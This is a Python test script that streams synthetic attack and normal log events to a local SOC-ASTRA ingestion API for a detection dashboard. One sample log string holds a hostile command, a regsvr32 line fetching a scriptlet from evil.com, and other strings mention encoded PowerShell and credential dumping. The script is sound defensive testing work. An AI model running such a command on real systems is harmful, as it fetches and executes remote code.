#!/usr/bin/env python3
"""
Test Script for SOC-ASTRA Log Ingestion
Sends sample logs to the API endpoint for testing
"""

import requests
import time
import random
from datetime import datetime
import json


class LogTester:
    """Test log ingestion"""
    
    def __init__(self, api_url='http://localhost:5000/api/ingest'):
        self.api_url = api_url
        self.sent_count = 0
        self.success_count = 0
        self.error_count = 0
    
    def send_log(self, log):
        """Send a single log to the API"""
        try:
            response = requests.post(
                self.api_url,
                json=log,
                timeout=5
            )
            
            self.sent_count += 1
            
            if response.status_code in [200, 202]:
                self.success_count += 1
                return True
            else:
                self.error_count += 1
                print(f"❌ Error: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            self.error_count += 1
            print(f"❌ Exception: {e}")
            return False
    
    def generate_sample_logs(self):
        """Generate various types of sample logs"""
        return [
            # Brute force attack
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Failed Login',
                'source_ip': '203.0.113.50',
                'dest_ip': '10.0.1.10',
                'username': 'admin',
                'hostname': 'DC-1',
                'event_id': '4625',
                'raw_log': 'Failed login attempt - brute force suspected'
            },
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Failed Login',
                'source_ip': '203.0.113.50',
                'dest_ip': '10.0.1.10',
                'username': 'administrator',
                'hostname': 'DC-1',
                'event_id': '4625',
                'raw_log': 'Failed login attempt - brute force suspected'
            },
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Successful Login',
                'source_ip': '203.0.113.50',
                'dest_ip': '10.0.1.10',
                'username': 'admin',
                'hostname': 'DC-1',
                'event_id': '4624',
                'raw_log': 'Successful login after multiple failed attempts'
            },
            # Port scan
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Port Scan',
                'source_ip': '198.51.100.25',
                'dest_ip': '10.0.1.20',
                'username': 'N/A',
                'hostname': 'FW-1',
                'event_id': '5156',
                'raw_log': 'Port scan detected from external IP'
            },
            # LSASS access (Mimikatz)
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Process Access - LSASS',
                'source_ip': '10.0.1.99',
                'dest_ip': '10.0.1.99',
                'username': 'admin',
                'hostname': 'WS-15',
                'event_id': '10',
                'raw_log': 'LSASS.exe memory access detected - possible credential dumping'
            },
            # Lateral movement
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Service Installation',
                'source_ip': '10.0.1.99',
                'dest_ip': '10.0.1.20',
                'username': 'admin',
                'hostname': 'SRV-2',
                'event_id': '7045',
                'raw_log': 'PSEXESVC service installed - lateral movement suspected'
            },
            # Data exfiltration
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Large Data Transfer',
                'source_ip': '10.0.1.30',
                'dest_ip': '185.220.101.40',
                'username': 'john.doe',
                'hostname': 'WS-20',
                'event_id': '5156',
                'raw_log': 'Large outbound data transfer: 500MB to external IP'
            },
            # Normal activity
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Successful Login',
                'source_ip': '192.168.1.50',
                'dest_ip': '10.0.1.10',
                'username': 'jane.smith',
                'hostname': 'WS-5',
                'event_id': '4624',
                'raw_log': 'Normal user login from workstation'
            },
            # Suspicious process
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'Suspicious Process Creation',
                'source_ip': '10.0.1.99',
                'dest_ip': '10.0.1.99',
                'username': 'admin',
                'hostname': 'WS-15',
                'event_id': '4688',
                'raw_log': 'Suspicious process: powershell.exe -enc <base64>'
            },
            # DNS tunneling
            {
                'timestamp': datetime.now().isoformat(),
                'event_type': 'DNS Tunneling',
                'source_ip': '10.0.1.99',
                'dest_ip': '8.8.8.8',
                'username': 'system',
                'hostname': 'WS-15',
                'event_id': '3008',
                'raw_log': 'Suspicious DNS query pattern detected - possible tunneling'
            }
        ]
    
    def test_single_log(self):
        """Test sending a single log"""
        print("="*70)
        print("TEST 1: Single Log Ingestion")
        print("="*70 + "\n")
        
        log = {
            'timestamp': datetime.now().isoformat(),
            'event_type': 'Test Event',
            'source_ip': '192.168.1.100',
            'dest_ip': '10.0.0.5',
            'username': 'test_user',
            'hostname': 'TEST-HOST',
            'raw_log': 'This is a test log'
        }
        
        print("Sending test log...")
        success = self.send_log(log)
        
        if success:
            print("✅ Log sent successfully!")
        else:
            print("❌ Failed to send log")
        
        print()
    
    def test_batch_logs(self):
        """Test sending batch of logs"""
        print("="*70)
        print("TEST 2: Batch Log Ingestion")
        print("="*70 + "\n")
        
        logs = self.generate_sample_logs()
        
        print(f"Sending {len(logs)} sample logs...\n")
        
        for i, log in enumerate(logs, 1):
            print(f"[{i}/{len(logs)}] Sending: {log['event_type']}")
            success = self.send_log(log)
            
            if success:
                print(f"   ✅ Accepted")
            else:
                print(f"   ❌ Failed")
            
            # Small delay between logs
            time.sleep(0.5)
        
        print()
    
    def test_burst_traffic(self, count=20):
        """Test rapid burst of logs"""
        print("="*70)
        print(f"TEST 3: Burst Traffic ({count} logs)")
        print("="*70 + "\n")
        
        print(f"Sending {count} logs rapidly...\n")
        
        start_time = time.time()
        
        for i in range(count):
            log = {
                'timestamp': datetime.now().isoformat(),
                'event_type': f'Burst Test Event {i+1}',
                'source_ip': f'192.168.1.{random.randint(1, 254)}',
                'dest_ip': '10.0.0.5',
                'username': 'test_user',
                'hostname': 'TEST-HOST',
                'raw_log': f'Burst test log #{i+1}'
            }
            
            self.send_log(log)
        
        elapsed = time.time() - start_time
        
        print(f"\n✅ Sent {count} logs in {elapsed:.2f} seconds")
        print(f"   Rate: {count/elapsed:.1f} logs/second\n")
    
    def test_realtime_stream(self, duration_seconds=60, interval=3):
        """Generate real-time log stream over time"""
        print("="*70)
        print(f"TEST 4: Real-Time Log Stream")
        print("="*70 + "\n")
        print(f"📡 Streaming logs for {duration_seconds} seconds")
        print(f"   Interval: {interval} seconds between logs")
        print(f"   Estimated logs: ~{duration_seconds // interval}")
        print("\n💡 Watch the dashboard at http://localhost:5000 to see real-time updates\n")
        print("Press Ctrl+C to stop early\n")
        print("-" * 70 + "\n")
        
        start_time = time.time()
        log_count = 0
        
        # Realistic attack scenarios for real-time simulation
        attack_scenarios = [
            {
                'event_type': 'Failed Login',
                'source_ip': '203.0.113.50',
                'dest_ip': '10.0.1.10',
                'username': random.choice(['admin', 'administrator', 'root']),
                'hostname': 'DC-1',
                'event_id': '4625',
                'raw_log': 'Failed login attempt - brute force attack in progress'
            },
            {
                'event_type': 'Port Scan',
                'source_ip': '198.51.100.25',
                'dest_ip': f'10.0.1.{random.randint(1, 30)}',
                'username': 'N/A',
                'hostname': 'FW-1',
                'event_id': '5156',
                'raw_log': f'Port scan detected - scanning port {random.choice([22, 80, 443, 445, 3389])}'
            },
            {
                'event_type': 'Process Access - LSASS',
                'source_ip': '10.0.1.99',
                'dest_ip': '10.0.1.99',
                'username': 'admin',
                'hostname': 'WS-15',
                'event_id': '10',
                'raw_log': 'LSASS.exe memory access - possible credential dumping (Mimikatz)'
            },
            {
                'event_type': 'Service Installation',
                'source_ip': '10.0.1.99',
                'dest_ip': f'10.0.1.{random.randint(20, 30)}',
                'username': 'admin',
                'hostname': f'SRV-{random.randint(1, 5)}',
                'event_id': '7045',
                'raw_log': 'PSEXESVC service installed - lateral movement detected'
            },
            {
                'event_type': 'Large Data Transfer',
                'source_ip': '10.0.1.30',
                'dest_ip': '185.220.101.40',
                'username': 'john.doe',
                'hostname': 'WS-20',
                'event_id': '5156',
                'raw_log': f'Large outbound transfer: {random.randint(100, 1000)}MB to external IP'
            },
            {
                'event_type': 'Suspicious Process Creation',
                'source_ip': '10.0.1.99',
                'dest_ip': '10.0.1.99',
                'username': 'admin',
                'hostname': 'WS-15',
                'event_id': '4688',
                'raw_log': random.choice([
                    'Suspicious process: powershell.exe -enc <base64>',
                    'Suspicious process: cmd.exe /c whoami',
                    'Suspicious process: regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll'
                ])
            },
            {
                'event_type': 'DNS Tunneling',
                'source_ip': '10.0.1.99',
                'dest_ip': '8.8.8.8',
                'username': 'system',
                'hostname': 'WS-15',
                'event_id': '3008',
                'raw_log': 'Suspicious DNS query pattern - possible data exfiltration via DNS'
            },
            {
                'event_type': 'Successful Login',
                'source_ip': random.choice(['203.0.113.50', '192.168.1.50']),
                'dest_ip': '10.0.1.10',
                'username': random.choice(['admin', 'jane.smith', 'john.doe']),
                'hostname': random.choice(['DC-1', 'WS-5', 'WS-10']),
                'event_id': '4624',
                'raw_log': random.choice([
                    'Successful login after multiple failed attempts',
                    'Normal user login from workstation',
                    'Administrative login from external IP'
                ])
            },
            {
                'event_type': 'Network Share Access',
                'source_ip': '10.0.1.99',
                'dest_ip': f'10.0.1.{random.randint(20, 30)}',
                'username': 'admin',
                'hostname': f'SRV-{random.randint(1, 5)}',
                'event_id': '5140',
                'raw_log': f'Share access: \\\\10.0.1.{random.randint(20, 30)}\\C$ - lateral movement'
            },
            {
                'event_type': 'Registry Access - SAM',
                'source_ip': '10.0.1.99',
                'dest_ip': '10.0.1.99',
                'username': 'admin',
                'hostname': 'DC-1',
                'event_id': '4663',
                'raw_log': 'SAM registry hive accessed - credential dumping attempt'
            }
        ]
        
        try:
            while (time.time() - start_time) < duration_seconds:
                # Pick random scenario
                scenario = random.choice(attack_scenarios)
                
                # Create log with current timestamp
                log = {
                    'timestamp': datetime.now().isoformat(),
                    **scenario
                }
                
                # Send log
                log_count += 1
                print(f"[{log_count}] {time.strftime('%H:%M:%S')} - {log['event_type']} from {log['source_ip']}")
                success = self.send_log(log)
                
                if success:
                    print(f"     ✅ Queued for analysis")
                else:
                    print(f"     ❌ Failed")
                
                # Wait before next log
                time.sleep(interval)
                
                # Show stats every 10 logs
                if log_count % 10 == 0:
                    elapsed = time.time() - start_time
                    remaining = duration_seconds - elapsed
                    print(f"\n📊 Progress: {log_count} logs sent | {remaining:.0f}s remaining | {log_count/elapsed:.1f} logs/sec\n")
        
        except KeyboardInterrupt:
            print("\n\n⚠️  Stream interrupted by user")
        
        elapsed = time.time() - start_time
        print(f"\n✅ Real-time stream complete!")
        print(f"   Duration: {elapsed:.1f} seconds")
        print(f"   Logs sent: {log_count}")
        print(f"   Average rate: {log_count/elapsed:.2f} logs/second")
        print(f"\n💡 Check dashboard: http://localhost:5000")
        print(f"   Incidents should appear in real-time!\n")
    
    def print_summary(self):
        """Print test summary"""
        print("="*70)
        print("TEST SUMMARY")
        print("="*70 + "\n")
        
        print(f"Total Logs Sent: {self.sent_count}")
        print(f"Successful: {self.success_count}")
        print(f"Failed: {self.error_count}")
        
        if self.sent_count > 0:
            success_rate = (self.success_count / self.sent_count) * 100
            print(f"Success Rate: {success_rate:.1f}%")
        
        print()


def main():
    """Main test execution"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║           🧪 SOC-ASTRA LOG INGESTION TEST                        ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    # Check if server is running
    print("Checking if web server is running...")
    try:
        response = requests.get('http://localhost:5000/api/health', timeout=5)
        if response.status_code == 200:
            print("✅ Server is running\n")
        else:
            print("⚠️  Server responded but health check failed\n")
    except Exception as e:
        print("❌ Server is not running!")
        print("   Please start the web server: python web_app.py\n")
        return
    
    # Initialize tester
    tester = LogTester()
    
    # Run tests
    print("Starting tests...\n")
    
    try:
        # Ask user what test to run
        print("Select test mode:")
        print("  1. Real-Time Stream (60 seconds, continuous)")
        print("  2. Real-Time Stream (custom duration)")
        print("  3. Batch Test (10 sample logs)")
        print("  4. Burst Test (20 logs rapidly)")
        print()
        
        choice = input("Select (1-4) [1]: ").strip() or "1"
        
        if choice == '1':
            # Default real-time stream
            tester.test_realtime_stream(duration_seconds=60, interval=3)
        elif choice == '2':
            # Custom real-time stream
            duration = int(input("Duration in seconds [60]: ").strip() or "60")
            interval = float(input("Interval between logs in seconds [3]: ").strip() or "3")
            tester.test_realtime_stream(duration_seconds=duration, interval=interval)
        elif choice == '3':
            # Batch test
            tester.test_batch_logs()
        elif choice == '4':
            # Burst test
            tester.test_burst_traffic(count=20)
        else:
            print("Invalid choice, running real-time stream...")
            tester.test_realtime_stream(duration_seconds=60, interval=3)
        
        # Print summary
        tester.print_summary()
        
        print("✅ All tests completed!")
        print("\n💡 Check the dashboard at http://localhost:5000 to see the incidents\n")
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Tests interrupted by user\n")
        tester.print_summary()
    except ValueError:
        print("\n❌ Invalid input. Please enter numbers only.\n")
        tester.print_summary()


if __name__ == "__main__":
    main()


